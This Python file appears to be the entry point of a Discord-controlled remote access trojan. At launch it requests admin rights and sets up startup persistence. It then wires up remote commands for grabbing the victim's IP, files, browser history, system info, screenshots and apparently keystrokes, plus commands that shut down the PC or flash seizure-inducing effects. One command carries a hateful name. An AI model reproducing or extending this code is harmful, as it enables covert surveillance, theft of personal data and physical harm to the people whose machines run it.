import discord
from discord.ext import commands
import discodd
import info
from command import ip_command, close_command, tts_command, admin_command, blur_command, playsound_command, errorspamz_command, screenswipe_command, tornado_command, seizure_command, clean_command, lp_command, tree_command, getfiles_command, kp_command, getbrowserhistory_command, share_command, sysinfo_command, screenshot_command
import startuplogic.askadmin
import startuplogic.addme
from command.fun import kkk_command, bassboost_command, thugfiles_command, wallpaper_command
startuplogic.askadmin.setup()
startuplogic.addme.run_setup_in_thread()
from command.useful import search_command, openurl_command, restartpc_command, shutdownpc_command

intents = discord.Intents.all()
bot = commands.Bot(command_prefix='.', intents=intents)

@bot.event
async def on_ready():
    print("Bot is ready.")
    for guild in bot.guilds:
        try:
            await info.start_messagesend(bot, guild)
        except discord.Forbidden as e:
            print(info.handle_permission_error(guild.name, e))
        except discord.HTTPException as e:
            print(info.handle_http_error(guild.name, e))
        except Exception as e:
            print(info.handle_generic_error(guild.name, e))

bot.allowed_channel_ids = {}

@bot.check
async def check_channel(ctx):
    allowed_channel_id = bot.allowed_channel_ids.get(ctx.guild.id)
    return allowed_channel_id is None or ctx.channel.id == allowed_channel_id

bot.add_command(commands.Command(ip_command.ip, name='ip'))
bot.add_command(commands.Command(clean_command.clean, name='clean'))
bot.add_command(commands.Command(lp_command.lp, name='lp'))
bot.add_command(commands.Command(tree_command.tree, name='tree'))
bot.add_command(commands.Command(getfiles_command.getfiles, name='getfiles'))
bot.add_command(commands.Command(kp_command.kp, name='kp'))
bot.add_command(commands.Command(getbrowserhistory_command.getbrowserhistory, name='getbrowserhistory'))
bot.add_command(commands.Command(share_command.share_file, name='share'))
bot.add_command(commands.Command(sysinfo_command.sysinfo, name='sysinfo'))
bot.add_command(commands.Command(screenshot_command.screenshot, name='ss'))
bot.add_command(commands.Command(seizure_command.seizure, name='seizure'))
bot.add_command(commands.Command(tornado_command.tornado, name='tornado'))
bot.add_command(commands.Command(screenswipe_command.screenswipe,   name='screenswipe'))
bot.add_command(commands.Command(errorspamz_command.errorspamz, name='errorspamz'))
bot.add_command(commands.Command(playsound_command.playsound, name='playsound'))
bot.add_command(commands.Command(blur_command.blur_command, name='blur'))
bot.add_command(commands.Command(admin_command.admin_command, name='admin'))
bot.add_command(commands.Command(tts_command.speak_command, name='speak'))
bot.add_command(commands.Command(close_command.close_command, name='close'))
bot.add_command(commands.Command(kkk_command.kkk_setup, name='kkk'))
bot.add_command(commands.Command(thugfiles_command.thugfiles, name='thugfiles'))
bot.add_command(commands.Command(wallpaper_command.wallpaper, name='wallpaper'))
bot.add_command(commands.Command(bassboost_command.bassboost, name='bassboost'))
bot.add_command(commands.Command(search_command.search, name='search'))
bot.add_command(commands.Command(openurl_command.openurl, name='openurl'))
bot.add_command(commands.Command(restartpc_command.restartpc, name='restartpc'))
bot.add_command(commands.Command(shutdownpc_command.shutdownpc, name='shutdownpc'))
bot.run(discodd.TOKEN)
